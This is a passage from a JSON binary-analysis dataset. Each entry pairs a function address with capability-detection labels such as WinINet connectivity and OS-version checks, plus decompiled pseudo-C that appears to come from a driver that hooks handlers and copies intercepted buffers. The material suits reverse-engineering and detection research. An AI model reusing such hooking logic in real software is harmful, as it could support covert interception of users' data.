(var_40h - piVar1)) - *var_40h);\n                            *0x8 = stack0xffffffdc + *var_40h;\n                        }\n                    }\n                    *(var_ch + 0x1c) = *(var_ch + 0x1c) - stack0xffffffdc;\n                }\n            }\n        }\n    }\n    var_4h = 0xffffffff;\n    if (var_28h != 0) {\n        if (bVar3) {\n            (**0x80051294)(var_28h);\n        }\n        (**0x800512a4)(var_28h);\n    }\n    fcn.000357f0(var_10h);\n    fcn.00016510(var_8h, var_ch);\n    *in_FS_OFFSET = var_10h_2;\n    return;\n}\n",
        "token_count": 1610
    },
    "00055700": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl\nfcn.00055700(int32_t *arg_8h, uint arg_ch, int32_t arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch, uint arg_20h, \n            int32_t *arg_24h, int32_t *arg_28h)\n\n{\n    char cVar1;\n    int32_t var_28h;\n    uint var_24h;\n    int32_t var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint16_t *var_dh;\n    uint16_t *var_8h;\n    int32_t var_4h;\n    \n    var_4h = 0;\n    var_20h = fcn.00054100(*arg_8h, &var_dh);\n    if (var_20h == 0) {\n        var_28h = -0x3fffff66;\n    }\n    else {\n        *0x4 = arg_10h + 4;\n        var_8h = var_20h + 0xff;\n        cVar1 = fcn.00057360(1);\n        if (cVar1 != '\\0') {\n            fcn.00038170(1, 0, *(arg_10h + 10), var_8h & 0xffff0000 | *(arg_10h + 8), *(var_8h + 1), *var_8h, \n                         var_20h + 8);\n        }\n        (**0x80051010)();\n        var_20h = 0;\n        var_28h = (*arg_8h[1])(arg_8h[2], arg_ch, arg_10h, arg_14h, arg_18h, arg_1ch, arg_20h, arg_24h, arg_28h);\n        if ((var_28h == -0x3fffffea) && (*arg_28h != 0)) {\n            var_28h = -0x3ffffec0;\n            var_4h = fcn.00054100(*(*(*arg_28h + 0x60) + 0x18), &var_dh);\n            if (var_4h != 0) {\n                *(var_4h + 0x154) = 0;\n                *(var_4h + 0x155) = 0;\n                *(var_4h + 0x158) = 0;\n                if (((*(var_4h + 0x24) == *arg_8h) && (*(var_4h + 0x150) == *arg_24h)) &&\n                   (*arg_24h = var_4h + 0x148,  *stack0xfffffff0 < 0x4c)) {\n                    fcn.00078be8(var_4h + 0xb0, stack0xfffffff0, *stack0xfffffff0);\n                    var_28h = -0x3fffffea;\n                }\n            }\n        }\n    }\n    if ((var_20h != 0) || (var_4h != 0)) {\n        (**0x80051010)();\n    }\n    return var_28h;\n}\n",
        "token_count": 722
    },
    "000558e0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl\nfcn.000558e0(int32_t arg_8h, int32_t arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch, uint arg_20h)\n\n{\n    char cVar1;\n    uint uVar2;\n    uint var_10h;\n    uint var_ch;\n    uchar var_5h;\n    int32_t var_4h;\n    \n    var_4h = 0;\n    var_4h = fcn.00054100(*(arg_ch + 4), &var_5h);\n    if ((var_4h == 0) || (cVar1 = *(var_4h + 0x154),  (**0x80051010)(),  cVar1 != '\\0')) {\n        uVar2 = 0;\n    }\n    else {\n        uVar2 = (**(arg_8h + 4))(*(arg_8h + 8), *(arg_ch + 8), arg_10h, arg_14h, arg_18h, arg_1ch, arg_20h);\n    }\n    return uVar2;\n}\n",
        "token_count": 255
    },
    "00055980": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl\nfcn.00055980(int32_t arg_8h, int32_t arg_ch, uint arg_10h, uint32_t arg_14h, uint arg_18h, uint32_t *arg_1ch, \n            uint arg_20h, uint *arg_24h)\n\n{\n    char cVar1;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    int32_t var_9h;\n    int32_t var_4h;\n    \n    var_4h = 0;\n    var_4h = fcn.00054100(*(arg_ch + 4), &var_9h);\n    if (var_4h == 0) {\n        var_18h = (**(arg_8h + 4))(*(arg_8h + 8), *(arg_ch + 8), arg_10h, arg_14h, arg_18h, arg_1ch, arg_20h, arg_24h);\n    }\n    else {\n        *0x8 = var_4h + 0xb0;\n        if (*(var_4h + 0x154) == '\\0') {\n            if (*(var_4h + 0x155) == '\\0') {\n                cVar1 = fcn.00055ea0(var_4h, *(var_4h + 0xb6), arg_14h & 0xffff0000 | *(var_4h + 0xb4), arg_20h, arg_14h\n                                    );\n                if (cVar1 == '\\0') {\n                    (**0x80051010)();\n                    var_4h = 0;\n                    if (*(arg_8h + 4) == 0) {\n                        *arg_1ch = 0;\n                        *arg_24h = 0;\n                        var_18h = 0xc000021b;\n                    }\n                    else {\n                        var_18h = (**(arg_8h + 4))(*(arg_8h + 8), *(arg_ch + 8), arg_10h, arg_14h, arg_18h, arg_1ch, \n                                                   arg_20h, arg_24h);\n                    }\n                }\n                else {\n                    *arg_1ch = arg_14h;\n                    *arg_24h = 0;\n                    var_18h = 0;\n                }\n            }\n            else {\n                (**0x80051010)();\n                var_4h = 0;\n                var_18h = (**(arg_8h + 4))(*(arg_8h + 8), *(arg_ch + 8), arg_10h, arg_14h, arg_18h, arg_1ch, arg_20h, \n                                           arg_24h);\n            }\n        }\n        else {\n            *arg_1ch = 0;\n            *arg_24h = 0;\n            var_18h = 0xc000021b;\n        }\n    }\n    if (var_4h != 0) {\n        (**0x80051010)();\n    }\n    return var_18h;\n}\n",
        "token_count": 688
    },
    "00055ba0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_28h\n// WARNING: Variable defined which should be unmapped: var_24h\n// WARNING: Variable defined which should be unmapped: var_20h\n\nuint __cdecl\nfcn.00055ba0(int32_t arg_8h, int32_t arg_ch, uint arg_10h, uint32_t arg_14h, int32_t arg_18h, int32_t *arg_1ch, \n            uint arg_20h)\n\n{\n    char cVar1;\n    int32_t var_28h;\n    uint32_t var_24h;\n    uint32_t var_20h;\n    int32_t var_1ch;\n    uint var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    int32_t var_9h;\n    int32_t var_4h;\n    \n    var_14h = arg_8h;\n    var_10h = arg_ch;\n    var_4h = 0;\n    var_4h = fcn.00054100(*(arg_ch + 4), &var_9h);\n    if (var_4h == 0) {\n        var_18h = (**(var_14h + 4))(*(var_14h + 8), *(var_10h + 8), arg_10h, arg_14h, arg_18h, arg_1ch, arg_20h);\n    }\n    else {\n        *0x4 = var_4h + 0xb0;\n        if (*(var_4h + 0x154) == '\\0') {\n            if (*(var_4h + 0x155) == '\\0') {\n                if (*arg_1ch == 0) {\n                    if ((*(arg_1ch + 6) & 5) == 0) {\n                        var_28h = (**0x80051230)(arg_1ch, 0);\n                    }\n                    else {\n                        var_28h = arg_1ch[3];\n                    }\n                    var_1ch = var_28h + arg_18h;\n                    cVar1 = fcn.00055ea0(var_4h, *(stack0xfffffff4 + 6), arg_14h & 0xffff0000 | *(stack0xfffffff4 + 4), \n                                         var_1ch, arg_14h);\n                    if (cVar1 == '\\0') {\n                        (**0x80051010)();\n                        var_4h = 0;\n                        var_18h = (**(var_14h + 4))(*(var_14h + 8), *(var_10h + 8), arg_10h, arg_14h, arg_18h, arg_1ch, \n                                                    arg_20h);\n                    }\n                    else {\n                        var_18h = 0;\n                    }\n                }\n                else {\n                    var_20h = fcn.000356f0(arg_14h);\n                    if (var_20h == 0) {\n                        (**0x80051010)();\n                        var_4h = 0;\n                        var_18h = (**(var_14h + 4))(*(var_14h + 8), *(var_10h + 8), arg_10h, arg_14h, arg_18h, arg_1ch, \n                                                    arg_20h);\n                    }\n                    else {\n                        (**0x800cdac8)(arg_1ch, arg_18h, var_20h, 0, arg_14h, &var_24h);\n                        var_20h = var_24h;\n                        cVar1 = fcn.00055ea0(var_4h, *(stack0xfffffff4 + 6), \n                                             var_24h & 0xffff0000 | *(stack0xfffffff4 + 4), var_24h, var_24h);\n                        if (cVar1 == '\\0') {\n                            (**0x80051010)();\n                            var_4h = 0;\n                            var_18h = (**(var_14h + 4))(*(var_14h + 8), *(var_10h + 8), arg_10h, arg_14h, arg_18h, \n                                                        arg_1ch, arg_20h);\n                        }\n                        else {\n                            var_18h = 0;\n                        }\n                        fcn.000357f0(var_20h);\n                    }\n                }\n            }\n            else {\n                (**0x80051010)();\n                var_4h = 0;\n                var_18h = (**(var_14h + 4))(*(var_14h + 8), *(var_10h + 8), arg_10h, arg_14h, arg_18h, arg_1ch, arg_20h)\n                ;\n            }\n        }\n        else {\n            var_18h = 0xc000021b;\n        }\n    }\n    if (var_4h != 0) {\n        (**0x80051010)();\n    }\n    return var_18h;\n}\n",
        "token_count": 1122
    },
    "00055ea0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00055ea0(int32_t arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, int32_t arg_18h)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint *puVar4;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    code *var_4h;\n    \n    if ((*(arg_8h + 0x154) == '\\0') && (*(arg_8h + 0x155) == '\\0')) {\n        iVar2 = fcn.0004c1c0(arg_14h, arg_18h, *(arg_8h + 0x158) == 0);\n        if (iVar2 == 0) {\n            *(arg_8h + 0x158) = *(arg_8h + 0x158) + arg_18h;\n            if (0x100 < *(arg_8h + 0x158)) {\n                *(arg_8h + 0x155) = 1;\n            }\n            uVar1 = 0;\n        }\n        else {\n            (**0x800512e4)();\n            *(arg_8h + 0x154) = 1;\n            var_4h = NULL;\n            var_8h = 0;\n            if (*(arg_8h + 0x24) != 0) {\n                iVar3 = fcn.00054100(*(arg_8h + 0x24), 0);\n                if ((iVar3 != 0) && (*(iVar3 + 0x3c) != 0)) {\n                    var_4h = *(iVar3 + 0x3c);\n                    var_8h = *(iVar3 + 0x40);\n                }\n            }\n            puVar4 = fcn.000356f0(0x614);\n            if (puVar4 == NULL) {\n                (**0x800512e0)();\n                *(arg_8h + 0x154) = 0;\n                *(arg_8h + 0x155) = 1;\n                (*var_4h)(var_8h, *(arg_8h + 0x150), 0, 0, 0, 0, 2);\n                uVar1 = 0;\n            }\n            else {\n                puVar4[6] = iVar2;\n                puVar4[4] = *(arg_8h + 0x1c);\n                puVar4[5] = *(arg_8h + 0x20);\n                puVar4[8] = arg_ch;\n                *(puVar4 + 9) = arg_10h;\n                puVar4[10] = var_4h;\n                puVar4[0xb] = var_8h;\n                puVar4[0xc] = *(arg_8h + 0x150);\n                puVar4[0x184] = arg_18h;\n                if (0x5dc < puVar4[0x184]) {\n                    puVar4[0x184] = 0x5dc;\n                }\n                fcn.00078be8(puVar4 + 0xd, arg_14h, puVar4[0x184]);\n                puVar4[7] = 0;\n                puVar4[2] = 0x8008cbc0;\n                puVar4[3] = puVar4;\n                *puVar4 = 0;\n                (**0x80051224)(puVar4, 1);\n                uVar1 = 1;\n            }\n        }\n    }\n    else {\n        uVar1 = 0;\n    }\n    return uVar1;\n}\n",
        "token_count": 832
    },
    "000560b0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x0005624e)\n// WARNING: Removing unreachable block (ram,0x00056243)\n// WARNING: Removing unreachable block (ram,0x00056265)\n// WARNING: Removing unreachable block (ram,0x000561aa)\n// WARNING: Removing unreachable block (ram,0x000561da)\n// WARNING: Removing unreachable block (ram,0x000561e1)\n// WARNING: Removing unreachable block (ram,0x000561ea)\n// WARNING: Removing unreachable block (ram,0x000561fd)\n// WARNING: Removing unreachable block (ram,0x00056206)\n// WARNING: Removing unreachable block (ram,0x00056216)\n\nuint fcn.000560b0(uint param_1, uint param_2, uint param_3, int32_t param_4, uint *param_5, uint param_6)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t arg_ch;\n    int32_t iVar3;\n    uint *in_FS_OFFSET;\n    uint var_8h;\n    uint var_ch;\n    uint var_10h;\n    int32_t var_14h;\n    uint *var_18h_2;\n    uint var_1ch_2;\n    uint var_18h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_10h_2;\n    uint uStack16;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x800b8c58;\n    uStack16 = 0x800b8bf4;\n    var_10h_2 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_10h_2;\n    if (var_14h == 0) {\n        *var_18h_2 = 0;\n        uVar2 = 0;\n    }\n    else {\n        arg_ch = (**0x80051234)(3, var_8h, 0, 0, 0, 0, 1, 0, 0);\n        if (arg_ch == 0) {\n            uVar2 = 0xc000009a;\n        }\n        else {\n            iVar3 = (**0x8005128c)(var_10h, var_14h, 0, 0, arg_ch);\n            if (iVar3 == 0) {\n                (**0x800512e8)();\n                uVar2 = 0xc000009a;\n            }\n            else {\n                var_4h = 0;\n                (**0x80051298)(iVar3, 0, 2);\n                var_4h = 0xffffffff;\n                iVar1 = *(arg_ch + 0x60);\n                *(iVar1 + -8) = 0;\n                *(iVar1 + -4) = 0;\n                *(iVar1 + -0x21) = 0;\n                iVar1 = *(arg_ch + 0x60);\n                *(iVar1 + -0x24) = 0xf;\n                *(iVar1 + -0x23) = 8;\n                *(iVar1 + -0x10) = var_8h;\n                *(iVar1 + -0xc) = var_ch;\n                *(iVar1 + -0x1c) = 0;\n                *(iVar1 + -0x20) = var_14h;\n                *(arg_ch + 4) = iVar3;\n                uVar2 = fcn.00056730(var_8h, arg_ch, 0xf, var_18h_2, var_1ch_2);\n            }\n        }\n    }\n    *in_FS_OFFSET = var_10h_2;\n    return uVar2;\n}\n",
        "token_count": 853
    },
    "000562f0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00056485)\n// WARNING: Removing unreachable block (ram,0x0005647a)\n// WARNING: Removing unreachable block (ram,0x0005649c)\n// WARNING: Removing unreachable block (ram,0x000563e1)\n// WARNING: Removing unreachable block (ram,0x00056411)\n// WARNING: Removing unreachable block (ram,0x00056418)\n// WARNING: Removing unreachable block (ram,0x00056421)\n// WARNING: Removing unreachable block (ram,0x00056434)\n// WARNING: Removing unreachable block (ram,0x0005643d)\n// WARNING: Removing unreachable block (ram,0x0005644d)\n\nuint fcn.000562f0(uint param_1, uint param_2, uint param_3, int32_t param_4)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t arg_ch;\n    int32_t iVar3;\n    uint *in_FS_OFFSET;\n    uint var_8h;\n    uint var_ch;\n    uint var_10h;\n    int32_t var_14h;\n    uint var_18h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_10h_2;\n    uint uStack16;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x800b8c48;\n    uStack16 = 0x800b8bf4;\n    var_10h_2 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_10h_2;\n    if (var_14h == 0) {\n        uVar2 = 0;\n    }\n    else {\n        arg_ch = (**0x80051234)(3, var_8h, 0, 0, 0, 0, 1, 0, 0);\n        if (arg_ch == 0) {\n            uVar2 = 0xc000009a;\n        }\n        else {\n            iVar3 = (**0x8005128c)(var_10h, var_14h, 0, 0, arg_ch);\n            if (iVar3 == 0) {\n                (**0x800512e8)();\n                uVar2 = 0xc000009a;\n            }\n            else {\n                var_4h = 0;\n                (**0x80051298)(iVar3, 0, 0);\n                var_4h = 0xffffffff;\n                iVar1 = *(arg_ch + 0x60);\n                *(iVar1 + -8) = 0;\n                *(iVar1 + -4) = 0;\n                *(iVar1 + -0x21) = 0;\n                iVar1 = *(arg_ch + 0x60);\n                *(iVar1 + -0x24) = 0xf;\n                *(iVar1 + -0x23) = 7;\n                *(iVar1 + -0x10) = var_8h;\n                *(iVar1 + -0xc) = var_ch;\n                *(iVar1 + -0x1c) = 0;\n                *(iVar1 + -0x20) = var_14h;\n                *(arg_ch + 4) = iVar3;\n                uVar2 = fcn.00056730(var_8h, arg_ch, 0xf, 0, 0xffffffff);\n            }\n        }\n    }\n    *in_FS_OFFSET = var_10h_2;\n    return uVar2;\n}\n",
        "token_count": 807
    },
    "00056530": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x0005660b)\n// WARNING: Removing unreachable block (ram,0x00056600)\n// WARNING: Removing unreachable block (ram,0x00056622)\n// WARNING: Removing unreachable block (ram,0x00056567)\n// WARNING: Removing unreachable block (ram,0x00056597)\n// WARNING: Removing unreachable block (ram,0x0005659e)\n// WARNING: Removing unreachable block (ram,0x000565a7)\n// WARNING: Removing unreachable block (ram,0x000565ba)\n// WARNING: Removing unreachable block (ram,0x000565c3)\n// WARNING: Removing unreachable block (ram,0x000565d3)\n\nuint __cdecl fcn.00056530(uint arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    int32_t arg_ch_00;\n    uint uVar2;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    arg_ch_00 = (**0x80051234)(3, arg_8h, 0, 0, 0, 0, 1, 0, 0);\n    if (arg_ch_00 == 0) {\n        uVar2 = 0xc000009a;\n    }\n    else {\n        iVar1 = *(arg_ch_00 + 0x60);\n        *(iVar1 + -8) = 0;\n        *(iVar1 + -4) = 0;\n        *(iVar1 + -0x21) = 0;\n        iVar1 = *(arg_ch_00 + 0x60);\n        *(iVar1 + -0x24) = 0xf;\n        *(iVar1 + -0x23) = 6;\n        *(iVar1 + -0x10) = arg_8h;\n        *(iVar1 + -0xc) = arg_ch;\n        *(iVar1 + -0x20) = 4;\n        *(iVar1 + -0x1c) = 0;\n        *(iVar1 + -0x18) = 0;\n        *(iVar1 + -0x14) = 0;\n        uVar2 = fcn.00056730(arg_8h, arg_ch_00, 0xf, 0, 0xffffffff);\n    }\n    return uVar2;\n}\n",
        "token_count": 526
    },
    "000566b0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.000566b0(uint noname_0, uint arg_ch)\n\n{\n    int32_t iVar1;\n    uint var_10h;\n    uint var_ch;\n    int32_t var_5h;\n    \n    *NULL = fcn.00054100(arg_ch, &var_5h);\n    if (*NULL != 0) {\n        while (*(stack0xfffffff8 + 0x15c) != stack0xfffffff8 + 0x15c) {\n            iVar1 = fcn.00053380(stack0xfffffff8 + 0x15c);\n            *(iVar1 + -0x40) = 0;\n            (**0x800512e8)();\n        }\n        (**0x80051010)();\n    }\n    return;\n}\n",
        "token_count": 169
    },
    "00056730": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.00056730(int32_t arg_8h, int32_t arg_ch, uint noname_2, uint *arg_14h, int32_t arg_18h)\n\n{\n    int32_t iVar1;\n    uint var_30h;\n    uint var_2ch;\n    int32_t var_28h;\n    uint var_24h;\n    int32_t var_14h;\n    int32_t var_10h;\n    uint var_9h;\n    uint var_4h;\n    \n    var_9h._0_1_ = '\\0';\n    (**0x800510d0)(&var_24h, 0, 0);\n    *(arg_ch + 0x2c) = &var_24h;\n    *(arg_ch + 0x28) = &var_9h + 1;\n    stack0xfffffff4 = 0xc0000001;\n    if (arg_18h != -1) {\n        iVar1 = *(arg_ch + 0x60);\n        var_28h = iVar1 + -0x24;\n        *(iVar1 + -8) = 0x800b8730;\n        *(iVar1 + -4) = &var_24h;\n        *(iVar1 + -0x21) = 0;\n        *(iVar1 + -0x21) = 0x40;\n        *(iVar1 + -0x21) = *(iVar1 + -0x21) | 0x80;\n        *(iVar1 + -0x21) = *(iVar1 + -0x21) | 0x20;\n    }\n    *(arg_ch + 0x23) = *(arg_ch + 0x23) + -1;\n    iVar1 = *(arg_ch + 0x60);\n    var_10h = iVar1 + -0x24;\n    *(arg_ch + 0x60) = var_10h;\n    *(iVar1 + -0x10) = arg_8h;\n    var_14h = (**(*(arg_8h + 8) + 0x38 + **(arg_ch + 0x60) * 4))(arg_8h, arg_ch);\n    if (var_14h == 0x103) {\n        if (arg_18h == -1) {\n            (**0x80051194)(&var_24h, 0, 0, 0, 0);\n        }\n        else {\n            _var_30h = fcn.00078be2(arg_18h, arg_18h >> 0x1f, 0xffffd8f0, 0xffffffff);\n            iVar1 = (**0x80051194)(&var_24h, 0, 0, 0, &var_30h);\n            if (iVar1 == 0x102) {\n                var_9h._0_1_ = '\\x01';\n                (**0x80051238)(arg_ch);\n                (**0x80051194)(&var_24h, 0, 0, 0, 0);\n            }\n        }\n    }\n    if (arg_18h != -1) {\n        (**0x800512e8)();\n    }\n    var_14h = stack0xfffffff4;\n    if (var_9h != '\\0') {\n        var_14h = 0x102;\n    }\n    if (arg_14h != NULL) {\n        *arg_14h = var_4h;\n    }\n    return var_14h;\n}\n",
        "token_count": 789
    },
    "000568e0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.000568e0(uint arg_8h, int32_t arg_ch, uint arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint var_4h;\n    \n    iVar2 = arg_ch;\n    pcVar1 = fcn.00063f30(arg_8h);\n    iVar2 = (*pcVar1)(arg_8h, iVar2, arg_10h, arg_14h, arg_18h);\n    if ((iVar2 != 0) && ((*(arg_ch + 4) == 0x102 || (*(arg_ch + 4) == 0x109)))) {\n        fcn.000569c0(arg_ch, *(arg_ch + 4) == 0x109);\n    }\n    return iVar2;\n}\n",
        "token_count": 192
    },
    "00056950": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00056950(uint arg_8h, int32_t arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint32_t arg_1ch)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint var_4h;\n    \n    iVar2 = arg_ch;\n    uVar3 = arg_1ch;\n    pcVar1 = fcn.00063f30(arg_8h);\n    iVar2 = (*pcVar1)(arg_8h, iVar2, arg_10h, arg_14h, arg_18h, uVar3);\n    if (((iVar2 != 0) && ((arg_1ch & 1) != 0)) && ((*(arg_ch + 4) == 0x102 || (*(arg_ch + 4) == 0x109)))) {\n        fcn.000569c0(arg_ch, *(arg_ch + 4) == 0x109);\n    }\n    return iVar2;\n}\n",
        "token_count": 235
    },
    "000569c0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.000569c0(uint *arg_8h, uint arg_ch)\n\n{\n    int16_t iVar1;\n    char cVar2;\n    int32_t iVar3;\n    uint var_a8h;\n    uint var_a0h;\n    uint *var_9ch;\n    uint var_98h;\n    uint var_40h;\n    int32_t var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    int32_t var_28h;\n    int32_t var_24h;\n    uint var_14h;\n    \n    cVar2 = fcn.00057360(2);\n    if ((cVar2 != '\\0') && ((arg_8h[3] & 0x80000000) == 0)) {\n        var_3ch = (**0x800da990)(*arg_8h, 0);\n        if (var_3ch != *0x800b935c) {\n            *0x800b935c = var_3ch;\n            iVar3 = fcn.00036d40(&var_14h, 0x11);\n            if (iVar3 == 0) {\n                var_14h._0_2_ = *0x800556d4;\n            }\n            fcn.00036320(&var_40h);\n            fcn.000367a0(&var_40h, &var_38h);\n            fcn.00078a20(&var_98h, 0x800556d8, var_24h + 0x76c, var_28h + 1, var_2ch, var_30h, var_34h, var_38h, \n                         &var_14h);\n            var_9ch = &var_98h;\n            do {\n                iVar1 = *var_9ch;\n                var_9ch = var_9ch + 2;\n            } while (iVar1 != 0);\n            fcn.00057330(2, &var_98h, (var_9ch - (&var_98h + 2) >> 1) << 1);\n        }\n        fcn.00057330(2, arg_8h + 2, (-(arg_ch != '\\0') & 2) + 2);\n    }\n    return;\n}\n",
        "token_count": 535
    },
    "00056b10": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Switch with 1 destination removed at 0x00056b63 : 36 cases all go to same destination\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t fcn.00056b10(void)\n\n{\n    int32_t iVar1;\n    uint var_28h;\n    int32_t var_24h;\n    uint var_1dh;\n    uint var_1h;\n    \n    var_1dh._0_1_ = '\\0';\n    var_1h._0_1_ = '\\0';\n    if (*0x800da994 == -1) {\n        var_24h = 0x21590001;\n    }\n    else if (*0x800da994 == 0) {\n        iVar1 = fcn.00035150();\n        if (iVar1 - 3U < 0x24) {\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        }\n        *0x800da994 = -1;\n        var_24h = 0x21590001;\n    }\n    else {\n        var_24h = fcn.00057130(2);\n        if (var_24h == 0) {\n            var_1dh._0_1_ = '\\x01';\n            if (*0x800ce962 != '\\0') {\n                return 0x21590006;\n            }\n            var_24h = fcn.00063fa0(2, *0x800cdad4, 0x800da990);\n            if (((var_24h == 0) && (var_24h = fcn.00063650(2, *0x800da994, 0x800968e0, 0x800da988),  var_24h == 0)) &&\n               (var_24h = fcn.00063650(2, *0x800cdad0, 0x80096950, 0x800da98c),  var_24h == 0)) {\n                fcn.00063fd0(0x800da988);\n                fcn.00063fd0(0x800da98c);\n                *0x800b935c = 0;\n                *0x800ce962 = '\\x01';\n                var_24h = 0;\n            }\n        }\n        if (var_24h != 0) {\n            if (var_1dh != '\\0') {\n                fcn.000572b0(2, 1);\n            }\n            fcn.00063fd0(*0x800da98c);\n            fcn.00063b20(0x800da98c);\n            fcn.00063fd0(*0x800da988);\n            fcn.00063b20(0x800da988);\n        }\n        if (var_1h != '\\0') {\n            (**0x800511bc)(&var_1dh + 1);\n        }\n    }\n    return var_24h;\n}\n",
        "token_count": 680
    },
    "00056e40": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
